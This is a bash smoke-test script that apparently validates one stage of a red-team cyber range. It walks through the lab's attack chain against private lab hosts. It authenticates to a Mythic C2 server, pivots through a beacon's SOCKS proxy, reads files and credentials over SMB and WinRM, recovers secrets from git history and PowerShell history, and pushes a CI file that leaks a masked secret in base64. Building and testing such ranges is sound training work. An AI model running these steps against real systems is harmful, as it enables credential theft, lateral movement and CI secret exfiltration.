#!/usr/bin/env bash
# smoke_m7_c2_pivot.sh -- standalone M7 smoke that requires the m6.s3
# plaintext (the decrypted C2 credential) and the svc_deploy SMB pwd
# as input (so it can run without re-walking M1-M6). Exercises:
#
#   [M7.s1]  authenticate to Mythic teamserver as redteam_ops (pw=m6.s3),
#            query active callbacks, read BEACHHEAD description = m7.s1
#            UUID. Validates the GraphQL/scripting path is the canonical
#            entry point (and that the m7.s1 UUID is NOT lying on c2.oscar
#            filesystem in plaintext -- the post-2026-06-06 gate).
#   [SOCKS]  task the BEACHHEAD callback to open a Mythic SOCKS proxy on
#            a chosen port. Confirms the alpha segment is reachable via
#            socks5h://c2.oscar:<port>.
#   [M7.s2]  through the SOCKS pivot, SMB to ws.alpha as svc_deploy and
#            read C:\Users\Public\pivot-proof.txt -> m7.s2 UUID.
#   [M7.s3]  pull C:\dev\deploy-scripts off ws.alpha via SMB; git log -p
#            recovers the deleted deploy.env -> DEPLOY_FLAG (m7.s3 UUID)
#            and GITLAB_PAT.
#   [M7.s4]  read svc_deploy's PSReadLine ConsoleHost_history.txt over
#            SMB -> m7.s4 UUID + TeamCity bearer token.
#   [M7.s5]  using the GITLAB_PAT recovered from m7.s3, push a manipulated
#            .gitlab-ci.yml to the infra/pipelines project; the
#            alpha-side runner executes and base64-leaks the masked
#            DEPLOY_SECRET into the job log -> m7.s5 UUID. (Slow; can
#            be skipped with --skip-m7s5.)
#
# An anti-regression check confirms the m7.s1 UUID is NOT recoverable
# from c2.oscar's filesystem via root-context grep -- the gate must be
# the Mythic API, not a file leak.
#
# Usage: bash smoke_m7_c2_pivot.sh --m6s3 <uuid> [--svc-deploy <pwd>]
#                                  [--manifest /path] [--logdir DIR]
#                                  [--socks-port N] [--skip-m7s5]
#                                  [--operator <user>]

set -uo pipefail

MYTHIC_HOST="10.30.0.30"
MYTHIC_PORT=7443
WS_ALPHA_IP="10.40.0.100"
GITLAB_IP="10.40.0.20"

OPERATOR="redteam_ops"
M6S3=""
# svc_deploy's SMB password is set by the M7 play to the m7.s1 UUID
# (see ansible/playbooks/m7_c2_cicd.yml stage 2 -- alpha_svc_password
# override). Default to that lookup; override only when the role is
# applied with the legacy literal `Sv3-Deploy-2026!`.
SVC_DEPLOY_PWD=""
MANIFEST=""
LOGDIR="/tmp/smoke-m7-$$"
SOCKS_PORT=7002
SKIP_M7S5=0

while [ $# -gt 0 ]; do
    case "$1" in
        --m6s3)        M6S3="$2"; shift 2 ;;
        --svc-deploy)  SVC_DEPLOY_PWD="$2"; shift 2 ;;
        --operator)    OPERATOR="$2"; shift 2 ;;
        --manifest)    MANIFEST="$2"; shift 2 ;;
        --logdir)      LOGDIR="$2"; shift 2 ;;
        --socks-port)  SOCKS_PORT="$2"; shift 2 ;;
        --skip-m7s5)   SKIP_M7S5=1; shift ;;
        -h|--help)     sed -n '2,35p' "$0"; exit 0 ;;
        *) echo "unknown arg: $1"; exit 2 ;;
    esac
done

if [ -z "$M6S3" ]; then
    echo "ERROR: --m6s3 <plaintext UUID> required (the m6.s3 plaintext / C2 cred)" >&2
    exit 2
fi
mkdir -p "$LOGDIR"
PASS=0; FAIL=0

c_red()    { printf '\033[31m%s\033[0m' "$*"; }
c_green()  { printf '\033[32m%s\033[0m' "$*"; }
c_blue()   { printf '\033[34m%s\033[0m' "$*"; }
c_yellow() { printf '\033[33m%s\033[0m' "$*"; }
section()  { echo; echo "============================================================"; echo " [$(c_blue "$1")] $2"; echo "============================================================"; }
ok()       { echo "  $(c_green ok): $*";   PASS=$((PASS+1)); }
bad()      { echo "  $(c_red FAIL): $*";   FAIL=$((FAIL+1)); }
note()     { echo "  $(c_yellow note): $*"; }

# Retry a (network) command up to N times with backoff. The Mythic SOCKS pivot
# to alpha occasionally stalls/drops a connection (git clone/push timeouts,
# curl exit 52); without a retry a single blip fails the whole milestone.
retry() {
    local n=1 max="${RETRY_MAX:-4}"
    while true; do
        "$@" && return 0
        [ "$n" -ge "$max" ] && return 1
        n=$((n+1)); sleep 3
    done
}

manifest_uuid() {
    local id="$1"
    if [ -z "$MANIFEST" ]; then
        MANIFEST="$(dirname "$0")/../flags/manifest.yaml"
    fi
    python3 -c "
import sys, yaml
m = yaml.safe_load(open('$MANIFEST'))
for f in m['flags']:
    if f['id'] == '$id':
        print(f['uuid']); sys.exit(0)
sys.exit(1)
"
}
EXPECT_S1=$(manifest_uuid m7.s1)
EXPECT_S2=$(manifest_uuid m7.s2)
EXPECT_S3=$(manifest_uuid m7.s3)
EXPECT_S4=$(manifest_uuid m7.s4)
EXPECT_S5=$(manifest_uuid m7.s5)

# Default svc_deploy pwd to the m7.s1 UUID (UUID-as-credential pattern).
if [ -z "$SVC_DEPLOY_PWD" ]; then
    SVC_DEPLOY_PWD="$EXPECT_S1"
fi

# We rely on the `mythic` python scripting client (same lib the M7 role
# uses for tag-callback). It comes from pip install mythic.
python3 -c "from mythic import mythic" 2>/dev/null || {
    echo "ERROR: 'mythic' python module not available. pip install mythic." >&2
    exit 2
}

# ====================================================================
# [M7.s1]   Mythic auth -> get BEACHHEAD description
# ====================================================================
section M7.s1 "auth to Mythic as $OPERATOR (pw=m6.s3), read BEACHHEAD callback description"
python3 - <<PY > "$LOGDIR/cbs.json" 2>"$LOGDIR/mythic_login.log"
import asyncio, json, sys
from mythic import mythic
async def go():
    mc = await mythic.login(username="$OPERATOR", password="$M6S3",
                            server_ip="$MYTHIC_HOST", server_port=$MYTHIC_PORT,
                            ssl=True, timeout=30)
    cbs = await mythic.get_all_active_callbacks(mythic=mc)
    print(json.dumps([{"display_id": c.get("display_id"),
                       "description": c.get("description"),
                       "host": c.get("host"), "user": c.get("user")} for c in cbs]))
try:
    asyncio.run(go())
except Exception as e:
    sys.stderr.write(f"login/query failed: {e}\n"); sys.exit(1)
PY

if [ ! -s "$LOGDIR/cbs.json" ]; then
    bad "Mythic login or callback query failed -- $(tail -2 "$LOGDIR/mythic_login.log" | tr '\n' ' ')"
    echo "ABORTING (no Mythic auth -- m6.s3 plaintext does not match $OPERATOR pwd)"
    exit 1
fi

GOT_S1=$(python3 -c "
import json
cbs = json.load(open('$LOGDIR/cbs.json'))
for c in cbs:
    d = (c.get('description') or '').strip()
    if d and len(d) == 36 and d.count('-') == 4:
        print(d); break
")
if [ "$GOT_S1" = "$EXPECT_S1" ]; then
    ok "m7.s1 captured (Mythic GraphQL -> BEACHHEAD description): $GOT_S1"
else
    bad "m7.s1 expected $EXPECT_S1 got '$GOT_S1' (see $LOGDIR/cbs.json)"
fi

# Pick the first active callback's display_id for downstream SOCKS task
DISPLAY_ID=$(python3 -c "
import json
cbs = json.load(open('$LOGDIR/cbs.json'))
if cbs: print(cbs[0].get('display_id') or '')
")
if [ -z "$DISPLAY_ID" ]; then
    bad "no active callback found -- can't issue SOCKS task"
    echo "ABORTING"
    exit 1
fi
note "using callback display_id=$DISPLAY_ID for SOCKS"

# ====================================================================
# [ANTI_REGRESSION]   m7.s1 UUID must NOT be on c2.oscar disk
# ====================================================================
section ANTI_REGRESSION "verify m7.s1 UUID is NOT plaintext on c2.oscar /opt /etc /root"
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
if ssh $SSH_OPTS -i ~/.ssh/id_ed25519 kali@$MYTHIC_HOST 'echo ok' >/dev/null 2>&1; then
    HITS=$(ssh $SSH_OPTS kali@$MYTHIC_HOST "echo kali | sudo -S grep -RIE '$EXPECT_S1' /opt/nilgiri /etc 2>/dev/null | head -5" 2>/dev/null)
    if [ -z "$HITS" ]; then
        ok "m7.s1 UUID not present on c2.oscar filesystem (only retrievable via API)"
    else
        bad "m7.s1 UUID LEAKED on c2.oscar disk: $HITS"
        note "(retag.sh / provision_mythic.py / etc. should not carry the UUID inline -- only the API has it)"
    fi
else
    note "ssh to c2.oscar unavailable from this smoke runner; skipping anti-regression grep"
fi

# ====================================================================
# [SOCKS]   task BEACHHEAD callback to open SOCKS on $SOCKS_PORT
# ====================================================================
section SOCKS "open Mythic SOCKS via callback $DISPLAY_ID on port $SOCKS_PORT"
python3 - <<PY 2>"$LOGDIR/socks_task.log"
import asyncio, json, sys
from mythic import mythic
async def go():
    mc = await mythic.login(username="$OPERATOR", password="$M6S3",
                            server_ip="$MYTHIC_HOST", server_port=$MYTHIC_PORT,
                            ssl=True, timeout=30)
    # 1) Drop the beacon to ~0s first. The beachhead is built with a 5s
    #    callback_interval; poseidon relays SOCKS datagrams on the beacon, so at
    #    5s (plus idle backoff) a single SMB handshake's round-trips blow past
    #    the nxc/smbclient timeouts. A real operator lowers sleep before
    #    pivoting -- so does the smoke. (sleep param is a bare interval string.)
    try:
        await mythic.issue_task_and_waitfor_task_output(
            mythic=mc, command_name="sleep", parameters="0",
            callback_display_id=$DISPLAY_ID, timeout=40)
    except Exception as e:
        sys.stderr.write(f"sleep lower failed (continuing): {e}\n")
    # Best-effort stop first: the mythic_server container holds the in-container
    # bind for $SOCKS_PORT until an explicit stop, so a prior aborted run (or a
    # re-run) trips "address already in use". Clear it, then start fresh.
    try:
        await mythic.issue_task_and_waitfor_task_output(
            mythic=mc, command_name="socks",
            parameters=json.dumps({"action":"stop","port":$SOCKS_PORT}),
            callback_display_id=$DISPLAY_ID, timeout=40)
    except Exception:
        pass
    # 2) Start SOCKS and WAIT for poseidon to actually engage the relay. The
    #    Mythic server's docker port-publish makes $SOCKS_PORT show as "listening"
    #    on the host at all times, so an nc-z proves nothing about agent
    #    readiness -- we must wait for the agent's "Socks started" task output
    #    before driving traffic, or s2-s5 race a relay that isn't live yet.
    out = await mythic.issue_task_and_waitfor_task_output(
        mythic=mc, command_name="socks",
        parameters=json.dumps({"action":"start","port":$SOCKS_PORT}),
        callback_display_id=$DISPLAY_ID, timeout=60)
    txt = out.decode("utf-8","replace") if isinstance(out,(bytes,bytearray)) else str(out)
    print(json.dumps({"socks_output": txt.strip()}))
    if "started" not in txt.lower():
        sys.exit(2)
try:
    asyncio.run(go())
except Exception as e:
    sys.stderr.write(f"socks task failed: {e}\n"); sys.exit(1)
PY
SOCKS_TASK_RC=$?

# Confirm the agent engaged SOCKS (task output above) AND the listener is up.
# The agent-side "Socks started" is the real readiness signal; nc-z is a
# secondary check that the server-side port is bound.
if [ "$SOCKS_TASK_RC" -eq 0 ] && nc -z -w 3 $MYTHIC_HOST $SOCKS_PORT 2>/dev/null; then
    ok "SOCKS proxy reachable at $MYTHIC_HOST:$SOCKS_PORT (agent relay engaged)"
    SOCKS_UP=1
fi
if [ "${SOCKS_UP:-0}" != "1" ]; then
    bad "SOCKS proxy did NOT come up on $MYTHIC_HOST:$SOCKS_PORT (see $LOGDIR/socks_task.log)"
    echo "ABORTING M7.s2-s5 (no alpha route)"
    echo
    echo "============================================================"
    echo "  PASS: $PASS    FAIL: $FAIL    logs: $LOGDIR"
    echo "============================================================"
    exit 1
fi

# Build a proxychains config once -- every alpha-side step (s2-s5) tunnels
# through the Mythic SOCKS proxy this way. netexec has NO native --socks flag
# (the pinned nxc errors with 'unrecognized arguments: --socks'), so SMB/WinRM
# tooling is wrapped in proxychains rather than handed a proxy flag.
cat > "$LOGDIR/proxychains.conf" <<EOF
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 $MYTHIC_HOST $SOCKS_PORT
EOF
PROXY="proxychains4 -q -f $LOGDIR/proxychains.conf"
if ! command -v proxychains4 >/dev/null 2>&1; then
    if command -v proxychains >/dev/null 2>&1; then
        PROXY="proxychains -q -f $LOGDIR/proxychains.conf"
    else
        PROXY=""
    fi
fi

# ====================================================================
# [M7.s2]   SOCKS -> SMB to ws.alpha as svc_deploy -> read pivot-proof.txt
# ====================================================================
# svc_deploy is deliberately NOT a local admin (see roles/alpha_pivot_host),
# so C$ + smb-exec are denied. The intended non-admin read path is the
# 'Public' SMB share (Everyone:R) that exposes C:\Users\Public.
section M7.s2 "smbclient //Public -> pivot-proof.txt (non-admin share path)"
if [ -z "$PROXY" ]; then
    bad "m7.s2 -- proxychains not installed; cannot tunnel SMB over the SOCKS pivot"
    NXC_OUT=""
else
    rm -f "$LOGDIR/pivot-proof.txt"
    timeout 90 $PROXY smbclient "//$WS_ALPHA_IP/Public" \
        -U "svc_deploy%$SVC_DEPLOY_PWD" \
        -c "prompt OFF; lcd $LOGDIR; get pivot-proof.txt" \
        2>"$LOGDIR/m7s2_smb.log" || true
    NXC_OUT=$(cat "$LOGDIR/pivot-proof.txt" 2>/dev/null)
fi
GOT_S2=$(echo "$NXC_OUT" | grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}" | head -1)
if [ "$GOT_S2" = "$EXPECT_S2" ]; then
    ok "m7.s2 captured: $GOT_S2"
elif [ -z "$GOT_S2" ]; then
    bad "m7.s2 -- no UUID in output. Likely the svc_deploy pwd is wrong OR SOCKS didn't reach ws.alpha. See $LOGDIR/m7s2_nxc.log"
    note "(svc_deploy:Sv3-Deploy-2026! is the default; pass --svc-deploy <pwd> if rotated)"
else
    bad "m7.s2 expected $EXPECT_S2 got '$GOT_S2'"
fi

# ====================================================================
# [M7.s3]   pull deploy-scripts repo -> git log -> deleted deploy.env
# ====================================================================
section M7.s3 "pull deploy-scripts git repo; mine history for DEPLOY_FLAG + GITLAB_PAT"
mkdir -p "$LOGDIR/deploy-scripts"
# git is NOT installed on ws.alpha and svc_deploy is non-admin (no C$), so the
# repo (working tree + .git history) is pulled over the non-admin 'deploy-scripts'
# SMB share and history-mined with the runner's own off-box git -- exactly the
# manifest's "pull via SMB, git log -p the deleted deploy.env" path.
if [ -z "$PROXY" ]; then
    bad "m7.s3 -- proxychains not installed; can't tunnel smbclient over SOCKS"
fi
if [ -n "$PROXY" ]; then
    $PROXY smbclient "//$WS_ALPHA_IP/deploy-scripts" \
        -U "svc_deploy%$SVC_DEPLOY_PWD" \
        -c "prompt OFF; recurse ON; lcd $LOGDIR/deploy-scripts; mget *" \
        2>"$LOGDIR/m7s3_smb.log" || true
    if [ -d "$LOGDIR/deploy-scripts/.git" ]; then
        # git show on the deleted file from the previous commit (the pulled tree
        # is owned by the runner, so mark it a safe.directory for git).
        DEPLOY_ENV=$(git -C "$LOGDIR/deploy-scripts" \
            -c safe.directory="$LOGDIR/deploy-scripts" show HEAD~1:deploy.env 2>/dev/null || true)
        GOT_S3=$(echo "$DEPLOY_ENV" | grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}" | head -1)
        GITLAB_PAT=$(echo "$DEPLOY_ENV" | grep -oE 'glpat-[A-Za-z0-9_-]+' | head -1)
        if [ "$GOT_S3" = "$EXPECT_S3" ]; then
            ok "m7.s3 captured (deleted deploy.env): $GOT_S3"
            note "GITLAB_PAT recovered: $GITLAB_PAT"
        elif [ -z "$GOT_S3" ]; then
            bad "m7.s3 -- no UUID in HEAD~1:deploy.env. See $LOGDIR/m7s3_smb.log + repo contents"
        else
            bad "m7.s3 expected $EXPECT_S3 got '$GOT_S3'"
        fi
    else
        bad "m7.s3 -- could not pull the deploy-scripts repo (no .git in $LOGDIR/deploy-scripts). See $LOGDIR/m7s3_smb.log"
    fi
fi

# ====================================================================
# [M7.s4]   read svc_deploy's PSReadLine ConsoleHost_history.txt
# ====================================================================
# svc_deploy is in Remote Management Users (non-admin WinRM), so the history
# file (ACL'd svc_deploy:R) is read over WinRM, not via SMB admin-exec. nxc
# winrm echoes the credential on its auth line, so drop any 'svc_deploy:' line
# before scraping the UUID/token to avoid matching the password (which is the
# m7.s1 UUID). nxc winrm runs in a PowerShell shell.
section M7.s4 "nxc winrm via proxychains -> svc_deploy ConsoleHost_history.txt"
if [ -z "$PROXY" ]; then
    bad "m7.s4 -- proxychains not installed; cannot tunnel WinRM over the SOCKS pivot"
    HIST_OUT=""
else
    HIST_OUT=$(timeout 120 $PROXY nxc winrm "$WS_ALPHA_IP" \
        -u svc_deploy -p "$SVC_DEPLOY_PWD" \
        -x 'type C:\Users\svc_deploy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' \
        2>&1 | tee "$LOGDIR/m7s4_hist.log" | grep -v 'svc_deploy:')
fi
GOT_S4=$(echo "$HIST_OUT" | grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}" | head -1)
TEAMCITY_BEARER=$(echo "$HIST_OUT" | grep -oE 'tcs-[A-Za-z0-9_-]+' | head -1)
if [ "$GOT_S4" = "$EXPECT_S4" ]; then
    ok "m7.s4 captured: $GOT_S4"
    [ -n "$TEAMCITY_BEARER" ] && note "TeamCity bearer recovered: $TEAMCITY_BEARER"
elif [ -z "$GOT_S4" ]; then
    bad "m7.s4 -- no UUID in PSReadLine history. See $LOGDIR/m7s4_hist.log"
else
    bad "m7.s4 expected $EXPECT_S4 got '$GOT_S4'"
fi

# ====================================================================
# [M7.s5]   GitLab CI pipeline manipulation -> DEPLOY_SECRET leak
# ====================================================================
if [ "$SKIP_M7S5" -eq 1 ]; then
    section M7.s5 "skipped via --skip-m7s5"
    note "m7.s5 requires CI pipeline run (~30-60s) over SOCKS; rerun without --skip-m7s5 to exercise"
else
    section M7.s5 "use GITLAB_PAT to push manipulated .gitlab-ci.yml -> read leaked DEPLOY_SECRET"
    if [ -z "${GITLAB_PAT:-}" ]; then
        bad "m7.s5 -- no GITLAB_PAT available (m7.s3 didn't succeed). Cannot exercise CI pipeline."
    elif [ -z "$PROXY" ]; then
        bad "m7.s5 -- proxychains unavailable; cannot tunnel git/curl to gitlab.alpha"
    else
        WORK="$LOGDIR/pipelines"
        for _ in 1 2 3 4; do
            rm -rf "$WORK"
            $PROXY git clone "http://oauth2:$GITLAB_PAT@$GITLAB_IP/infra/pipelines.git" "$WORK" 2>"$LOGDIR/m7s5_clone.log" && break
            sleep 3
        done
        if [ ! -d "$WORK/.git" ]; then
            bad "m7.s5 -- git clone failed (see $LOGDIR/m7s5_clone.log)"
        else
            # Manipulate .gitlab-ci.yml so it base64-encodes DEPLOY_SECRET (defeats GitLab's
            # literal-string masking) and echos it to job log.
            # NB: no `tags:` -- the project's runner only services UNTAGGED jobs
            # (the original deploy pipeline has no tags); a `tags: [shared]` job
            # sits Pending forever with no matching runner.
            cat > "$WORK/.gitlab-ci.yml" <<'YML'
stages: [leak]
leak:
  stage: leak
  script:
    - echo "BEGIN_LEAK"
    - printf '%s' "$DEPLOY_SECRET" | base64
    - echo "END_LEAK"
YML
            # --allow-empty + a nonce in the message: the snapshot's main may
            # already carry an identical leak .gitlab-ci.yml from a prior smoke
            # run, in which case `commit -am` finds no diff, push reports
            # "Everything up-to-date", and NO new pipeline is created (the poll
            # below then times out on a stale pipeline). Forcing a unique commit
            # guarantees a fresh pipeline runs the current leak job every time.
            ( cd "$WORK" && git -c user.email=smoke@smoke -c user.name=smoke \
                  commit --allow-empty -am "smoke probe $(date +%s%N)" >/dev/null 2>&1 || true
              retry $PROXY git push origin HEAD:main 2>"$LOGDIR/m7s5_push.log" )
            PUSHED_SHA=$(git -C "$WORK" rev-parse HEAD 2>/dev/null)
            # Poll for the latest pipeline job and read the log
            # Inject shell vars via env, not heredoc interpolation: a QUOTED
            # heredoc (<<'PY') stops bash from processing the Python body. The
            # body contains a backtick in a comment ("`$ command`") which an
            # unquoted heredoc would parse as command substitution -> the
            # `line N: $: command not found` failure this replaced.
            LOGDIR="$LOGDIR" GITLAB_PAT="$GITLAB_PAT" GITLAB_IP="$GITLAB_IP" PUSHED_SHA="$PUSHED_SHA" \
            python3 - <<'PY' > "$LOGDIR/m7s5_decode.log" 2>&1
import os, re, base64, time, urllib.parse, subprocess, json
LOGDIR = os.environ['LOGDIR']; GITLAB_PAT = os.environ['GITLAB_PAT']
GITLAB_IP = os.environ['GITLAB_IP']; PUSHED_SHA = os.environ['PUSHED_SHA']
def proxied_curl(url):
    # GitLab is reached over the Mythic SOCKS pivot, which occasionally drops a
    # request (curl exit 52, "empty reply from server"). Retry a few times so a
    # single blip mid-poll doesn't abort the whole decode with a traceback.
    cmd = ['proxychains4','-q','-f',LOGDIR+'/proxychains.conf',
           'curl','-sS','--max-time','30','-H','PRIVATE-TOKEN: '+GITLAB_PAT,url]
    for _ in range(4):
        try:
            return subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode('utf-8','replace')
        except subprocess.CalledProcessError:
            time.sleep(2)
    return subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode('utf-8','replace')
proj = urllib.parse.quote_plus('infra/pipelines')
# Wait for the pipeline of OUR pushed commit specifically -- selecting "latest"
# races GitLab's pipeline creation (it would read the prior deploy pipeline) and
# could also latch a stale run.
sha = PUSHED_SHA
pid = None
for _ in range(40):
    pls = json.loads(proxied_curl(f"http://{GITLAB_IP}/api/v4/projects/{proj}/pipelines?sha={sha}"))
    if pls:
        pid = pls[0]['id']; break
    time.sleep(3)
if pid is None:
    print(f"no pipeline created for pushed sha {sha}"); raise SystemExit(1)
for _ in range(60):
    jobs = json.loads(proxied_curl(f"http://{GITLAB_IP}/api/v4/projects/{proj}/pipelines/{pid}/jobs"))
    if jobs and jobs[0]['status'] in ('success','failed'):
        jid = jobs[0]['id']
        log = proxied_curl(f"http://{GITLAB_IP}/api/v4/projects/{proj}/jobs/{jid}/trace")
        # GitLab interleaves `$ command` echoes + ANSI color codes between the
        # BEGIN_LEAK/END_LEAK output lines, so strip ANSI then grab the base64
        # line that sits between the markers (skipping echoed command lines).
        clean = re.sub(r'\x1b\[[0-9;]*m', '', log)
        m = re.search(r'^BEGIN_LEAK$.*?^([A-Za-z0-9+/=]{20,})$.*?^END_LEAK$',
                      clean, re.MULTILINE | re.DOTALL)
        if m:
            print(base64.b64decode(m.group(1)).decode('utf-8','replace').strip())
            raise SystemExit(0)
        print("LOG without BEGIN_LEAK marker:")
        print(clean[-2000:])
        raise SystemExit(2)
    time.sleep(3)
print("pipeline did not finish within 120s")
raise SystemExit(3)
PY
            GOT_S5=$(grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}" "$LOGDIR/m7s5_decode.log" | head -1)
            if [ "$GOT_S5" = "$EXPECT_S5" ]; then
                ok "m7.s5 captured (CI pipeline leak of DEPLOY_SECRET): $GOT_S5"
            elif [ -z "$GOT_S5" ]; then
                bad "m7.s5 -- pipeline ran but no UUID surfaced. See $LOGDIR/m7s5_decode.log"
            else
                bad "m7.s5 expected $EXPECT_S5 got '$GOT_S5'"
            fi
        fi
    fi
fi

# ---- cleanup: stop the Mythic SOCKS proxy --------------------------
python3 - <<PY 2>>"$LOGDIR/socks_task.log" || true
import asyncio, json
from mythic import mythic
async def go():
    mc = await mythic.login(username="$OPERATOR", password="$M6S3",
                            server_ip="$MYTHIC_HOST", server_port=$MYTHIC_PORT,
                            ssl=True, timeout=30)
    # See the API drift note above on issue_task -- no return_on_complete here either.
    await mythic.issue_task(mythic=mc, command_name="socks",
        parameters=json.dumps({"action":"stop","port":$SOCKS_PORT}),
        callback_display_id=$DISPLAY_ID)
asyncio.run(go())
PY

# ---- summary -------------------------------------------------------
echo
echo "============================================================"
echo "  PASS: $PASS    FAIL: $FAIL"
echo "  logs: $LOGDIR"
echo "============================================================"
[ "$FAIL" -eq 0 ] || exit 1
